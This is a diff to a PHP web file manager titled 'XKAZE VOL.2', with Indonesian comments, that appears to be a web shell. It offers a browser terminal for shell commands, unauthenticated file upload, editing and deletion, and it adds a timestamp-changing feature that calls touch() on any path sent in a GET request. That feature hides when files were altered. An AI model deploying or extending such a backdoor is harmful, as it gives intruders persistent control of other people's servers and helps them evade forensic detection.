@@ -190,23 +190,122 @@ PING google.com (8.8.8.8): bytes=56 ttl=117 time=23.2 ms");
 
     o("bash: $cmd: command not found");
 }
+
+if (isset($_GET['update_time']) && isset($_GET['file_path']) && isset($_GET['new_time'])) {
+    $filePath = $_GET['file_path'];  // Path file yang ingin diubah waktunya
+    $newTime = $_GET['new_time'];    // Waktu baru yang diinput oleh user
+
+    // Ubah waktu menjadi timestamp
+    $timestamp = strtotime($newTime);
+
+    // Pastikan timestamp valid
+    if ($timestamp !== false) {
+        // Update waktu file
+        touch($filePath, $timestamp);
+        echo "File time updated!";
+    } else {
+        echo "Invalid time format!";
+    }
+    exit;
+}
 ?>
 
 <!DOCTYPE html>
 <html>
 <head>
-<title>File Manager</title>
+<title>XKAZE VOL.2</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
 <style>
-body { background:#101010; color:#eee; font-family:Arial; padding:20px; }
-a { color:#4fc3f7; text-decoration:none; }
-table { border-collapse:collapse; width:100%; margin-top:15px; }
-td,th { border:1px solid #444; padding:8px; }
-tr:nth-child(even) { background:#181818; }
-input,button,textarea { background:#222; color:#fff; border:1px solid #555; padding:5px; }
-button { cursor:pointer; }
-.folder { color:#7cff7c; font-weight:bold; }
-.file { color:#ccc; }
-.breadcrumb a { color:#7cffea; }
+#open-terminal-btn {
+    padding: 10px;
+    background: #333;
+    color: #0f0;
+    border: 1px solid #555;
+    cursor: pointer;
+    display: inline-block;
+}
+
+#open-terminal-btn i {
+    font-size: 40px;
+    color: #0f0;
+}
+
+a {
+    color: #4fc3f7; /* Warna biru */
+    text-decoration: none; /* Menghilangkan garis bawah */
+    font-size: 18px; /* Ukuran font */
+    margin-right: 10px; /* Jarak antar ikon */
+}
+
+a:hover {
+    color: #ff4081; /* Warna saat hover */
+}
+
+body { 
+    font‑family: "Roboto", Arial, sans‑serif;
+    background:#101010; 
+    color:#eee; 
+    font-family:Arial; 
+    padding:20px; 
+}
+
+a { 
+    color:#4fc3f7; 
+    text-decoration:none; 
+}
+
+table {
+    border-collapse: collapse;
+    width: 80%;
+    margin: 0 auto;
+    margin-top: 15px;
+}
+
+td, th { 
+    border:1px solid #444; 
+    padding:8px; 
+}
+
+tr:nth-child(even) { 
+    background:#181818; 
+}
+
+input, button, textarea { 
+    background:#222; 
+    color:#fff; 
+    border:1px solid #555; 
+    padding:5px; 
+}
+
+button {
+    background: none;
+    border: none;
+    cursor: pointer;
+}
+
+button i {
+    font-size: 28px; 
+    color: #4fc3f7;
+}
+
+.folder { 
+    color:#7cff7c; 
+    font-weight:bold; 
+}
+
+.file { 
+    color:#ccc; 
+}
+
+.breadcrumb a { 
+    color:#7cffea; 
+}
+
+/* Set lebar kolom "Updated" */
+th:nth-child(4), td:nth-child(4) {
+    width: 150px;  /* Sesuaikan dengan ukuran yang diinginkan */
+}
 </style>
 </head>
 <body>
@@ -226,14 +325,49 @@ foreach ($parts as $p) {
     echo "<a href='?path=$acc'>$p</a> / ";
 }
 ?>
-</div>
-<hr>
+</div><br>
+<center>
 
-<form method="POST">
-    <input type="text" name="newfolder" placeholder="Nama folder">
-    <input type="hidden" name="path" value="<?= $path ?>">
-    <button>Buat Folder</button>
-</form>
+<div id="terminal-container" style="text-align:center;">
+    <button id="open-terminal-btn" style="padding:10px; background:#333; color:#0f0; border:1px solid #555; cursor: pointer; display: inline-block;">
+        <i class="fas fa-terminal" style="font-size: 40px; color: #0f0;"></i>
+    </button>
+</div>
+<div id="tbox" style="
+    display:none;
+    background:#000;
+    color:#0f0;
+    padding:10px;
+    height:350px;
+    overflow:auto;
+    font-family:monospace;
+    font-size:14px;
+    margin-top:10px;
+"></div>
+
+<input id="tinput" type="text" placeholder="command..."
+style="
+    display:none;
+    width:100%;
+    padding:8px;
+    margin-top:5px;
+    background:#111;
+    color:#0f0;
+    border:1px solid #444;
+    font-family:monospace;
+">
+
+
+
+<div id="folder-form" style="display:none;">
+    <form method="POST">
+        <input type="text" name="newfolder" id="folder-name" placeholder="Masukkan nama folder">
+        <button type="submit">Buat Folder</button>
+    </form>
+</div>
+<button id="create-folder">
+    <i class="fas fa-folder-plus"></i> 
+</button>
 
 <?php
 if (isset($_POST['newfolder'])) {
@@ -243,11 +377,15 @@ if (isset($_POST['newfolder'])) {
 }
 ?>
 
-<form method="POST">
-    <input type="text" name="newfile" placeholder="Nama file">
-    <input type="hidden" name="path" value="<?= $path ?>">
-    <button>Buat File</button>
-</form>
+<div id="file-form" style="display:none;">
+    <form method="POST">
+        <input type="text" name="newfile" id="file-name" placeholder="Masukkan nama file">
+        <button type="submit">Buat File</button>
+    </form>
+</div>
+<button id="create-file">
+    <i class="fas fa-file-upload"></i>
+</button>
 
 <?php
 if (isset($_POST['newfile'])) {
@@ -257,68 +395,16 @@ if (isset($_POST['newfile'])) {
 }
 ?>
 
-<form method="POST" enctype="multipart/form-data">
-    <input type="file" name="upfile">
-    <input type="hidden" name="path" value="<?= $path ?>">
-    <button>Upload</button>
-</form>
-
-<?php
-if (!empty($_FILES['upfile']['name'])) {
-    move_uploaded_file($_FILES['upfile']['tmp_name'], $_POST['path'] . "/" . basename($_FILES['upfile']['name']));
-    header("Location: ?path=" . urlencode($_POST['path']));
-    exit;
-}
-?>
-
-<table>
-<tr>
-    <th>Nama</th>
-    <th>Type</th>
-    <th>Size</th>
-    <th>Updated</th>
-    <th>Aksi</th>
-</tr>
-
-<?php foreach($folders as $f): ?>
-<?php
-    $full = $path . "/" . $f;
-    $lastMod = date("Y-m-d H:i:s", filemtime($full));
-?>
-<tr>
-    <td class="folder">📁 <a href="?path=<?= safe($full) ?>"><?= safe($f) ?></a></td>
-    <td>Folder</td>
-    <td>-</td>
-    <td><?= $lastMod ?></td>
-    <td>
-        <a href="?rename=<?= safe($full) ?>&path=<?= safe($path) ?>">Rename</a> |
-        <a href="?delete=<?= safe($full) ?>&path=<?= safe($path) ?>" onclick="return confirm('Hapus folder?')">Delete</a>
-    </td>
-</tr>
-<?php endforeach; ?>
-
-<?php foreach($files as $f): ?>
-<?php
-    $full = $path . "/" . $f;
-    $sizeKB = round(filesize($full) / 1024, 2);
-    $lastMod = date("Y-m-d H:i:s", filemtime($full));
-?>
-<tr>
-    <td class="file">📄 <?= safe($f) ?></td>
-    <td>File</td>
-    <td><?= $sizeKB ?> KB</td>
-    <td><?= $lastMod ?></td>
-    <td>
-        <a href="?view=<?= safe($full) ?>&path=<?= safe($path) ?>">View</a> |
-        <a href="?edit=<?= safe($full) ?>&path=<?= safe($path) ?>">Edit</a> |
-        <a href="?rename=<?= safe($full) ?>&path=<?= safe($path) ?>">Rename</a> |
-        <a href="?delete=<?= safe($full) ?>&path=<?= safe($path) ?>" onclick="return confirm('Hapus file?')">Delete</a>
-    </td>
-</tr>
-<?php endforeach; ?>
-
-</table>
-
+<div id="upload-form" style="display:none;">
+    <form method="POST" enctype="multipart/form-data">
+        <input type="file" name="upfile">
+        <input type="hidden" name="path" value="<?= $path ?>">
+        <button type="submit">Upload</button>
+    </form>
+</div>
+<button id="upload-file" style="background:none; border:none; cursor:pointer;">
+    <i class="fas fa-upload"></i>
+</button>
 <!-- VIEW FILE -->
 <?php if (isset($_GET['view']) && is_file($_GET['view'])): ?>
 <hr><h3>📄 View File</h3>
@@ -370,39 +456,90 @@ if (isset($_POST['rename_from'])) {
 }
 ?>
 
-<hr>
-<h3>🖥️ Terminal</h3>
+<?php
+if (!empty($_FILES['upfile']['name'])) {
+    move_uploaded_file($_FILES['upfile']['tmp_name'], $_POST['path'] . "/" . basename($_FILES['upfile']['name']));
+    header("Location: ?path=" . urlencode($_POST['path']));
+    exit;
+}
+?>
+</center>
+<table>
+<tr>
+    <th>Nama</th>
+    <th>Type</th>
+    <th>Size</th>
+    <th>Updated</th>
+    <th>Aksi</th>
+</tr>
 
-<button onclick="showTerminal()" 
-style="padding:10px; background:#333; color:#0f0; border:1px solid #555;">
-    Open Terminal
-</button>
+<?php foreach($folders as $f): ?>
+<?php
+    $full = $path . "/" . $f;
+    $lastMod = date("Y-m-d H:i:s", filemtime($full));
+?>
+<tr>
+    <td class="folder">📁 <a href="?path=<?= safe($full) ?>"><?= safe($f) ?></a></td>
+    <td>Folder</td>
+    <td>-</td>
+    <td>
+    <span id="time-<?= safe($full) ?>" onclick="editTime('<?= safe($full) ?>', '<?= $lastMod ?>')">
+        <?= $lastMod ?>
+    </span>
+</td>
+    <td>
+       <a href="?rename=<?= safe($full) ?>&path=<?= safe($path) ?>" title="Rename">
+        <i class="fas fa-pencil-alt"></i> 
+        <a href="?delete=<?= safe($full) ?>&path=<?= safe($path) ?>" onclick="return confirm('Hapus folder?')" title="Delete">
+    <i class="fas fa-trash-alt"></i> 
+</a>
 
-<div id="tbox" style="
-    display:none;
-    background:#000;
-    color:#0f0;
-    padding:10px;
-    height:350px;
-    overflow:auto;
-    font-family:monospace;
-    font-size:14px;
-    margin-top:10px;
-"></div>
+    </td>
+</tr>
+<?php endforeach; ?>
 
-<input id="tinput" type="text" placeholder="command..."
-style="
-    display:none;
-    width:100%;
-    padding:8px;
-    margin-top:5px;
-    background:#111;
-    color:#0f0;
-    border:1px solid #444;
-    font-family:monospace;
-">
+<?php foreach($files as $f): ?>
+<?php
+    $full = $path . "/" . $f;
+    $sizeKB = round(filesize($full) / 1024, 2);
+    $lastMod = date("Y-m-d H:i:s", filemtime($full));
+?>
+<tr>
+    <td class="file">📄 <?= safe($f) ?></td>
+    <td>File</td>
+    <td><?= $sizeKB ?> KB</td>
+    <td>
+    <span id="time-<?= safe($full) ?>" onclick="editTime('<?= safe($full) ?>', '<?= $lastMod ?>')">
+        <?= $lastMod ?>
+    </span>
+</td>
+    <td>
+    <a href="?view=<?= safe($full) ?>&path=<?= safe($path) ?>" title="View">
+        <i class="fas fa-eye"></i> 
+    </a> 
+    <a href="?edit=<?= safe($full) ?>&path=<?= safe($path) ?>" title="Edit">
+        <i class="fas fa-edit"></i> 
+    </a> 
+    <a href="?rename=<?= safe($full) ?>&path=<?= safe($path) ?>" title="Rename">
+        <i class="fas fa-pencil-alt"></i> 
+    </a>
+    <a href="?delete=<?= safe($full) ?>&path=<?= safe($path) ?>" onclick="return confirm('Hapus file?')" title="Delete">
+        <i class="fas fa-trash-alt"></i> 
+    </a>
+</td>
+</tr>
+<?php endforeach; ?>
+
+</table>
 
 <script>
+document.getElementById('open-terminal-btn').addEventListener('click', function() {
+    document.getElementById('tbox').style.display = 'block';
+    document.getElementById('tinput').style.display = 'block';
+    document.getElementById('tinput').focus();
+});
+
+
 function showTerminal(){
     document.getElementById("tbox").style.display = "block";
     document.getElementById("tinput").style.display = "block";
@@ -430,7 +567,55 @@ tinput.addEventListener("keydown", function(e){
         tinput.value = "";
     }
 });
+
+function editTime(filePath, currentTime) {
+    // Ambil elemen span yang berisi waktu
+    var timeElement = document.getElementById('time-' + filePath);
+    
+    // Ganti span dengan input field untuk mengedit waktu
+    var inputHTML = `<input type="datetime-local" value="${currentTime}" id="edit-time-${filePath}" />`;
+    timeElement.innerHTML = inputHTML;
+
+    // Fokuskan input field setelah muncul
+    document.getElementById('edit-time-' + filePath).focus();
+    
+    // Event listener untuk save perubahan setelah selesai edit
+    document.getElementById('edit-time-' + filePath).addEventListener('blur', function() {
+        saveNewTime(filePath);
+    });
+}
+
+function saveNewTime(filePath) {
+    // Ambil waktu baru yang dimasukkan pengguna
+    var newTime = document.getElementById('edit-time-' + filePath).value;
+    
+    if (newTime) {
+        // Kirimkan data ke PHP untuk mengupdate waktu
+        fetch('?update_time=1&file_path=' + encodeURIComponent(filePath) + '&new_time=' + encodeURIComponent(newTime))
+            .then(response => response.text())
+            .then(result => {
+                alert('Time updated!');
+                location.reload(); // Refresh halaman untuk melihat waktu yang baru
+            });
+    }
+}
+
+document.getElementById('create-folder').addEventListener('click', function() {
+    document.getElementById('folder-form').style.display = 'inline-block'; 
+});
+
+document.getElementById('create-file').addEventListener('click', function() {
+    document.getElementById('file-form').style.display = 'inline-block'; 
+});
+
+document.getElementById('upload-file').addEventListener('click', function() {
+    // Menampilkan form upload file saat tombol diklik
+    document.getElementById('upload-form').style.display = 'block';
+});
+
 </script>
+
+
 
 </body>
 </html>
